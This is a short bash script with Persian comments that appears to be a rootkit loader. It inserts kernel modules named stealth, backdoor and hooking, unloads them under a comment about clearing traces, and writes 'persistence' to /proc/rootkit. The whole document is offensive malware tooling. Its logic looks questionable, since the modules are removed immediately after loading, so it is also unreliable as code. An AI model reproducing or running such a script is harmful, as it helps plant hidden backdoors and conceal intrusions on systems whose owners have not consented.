#!/bin/bash

# بارگذاری اولیه
insmod stealth.ko
insmod backdoor.ko
insmod hooking.ko

# پاک‌کردن ردپا
rmmod stealth 2>/dev/null
rmmod backdoor 2>/dev/null
rmmod hooking 2>/dev/null

# فعال‌سازی مقاومت
echo "persistence" > /proc/rootkit
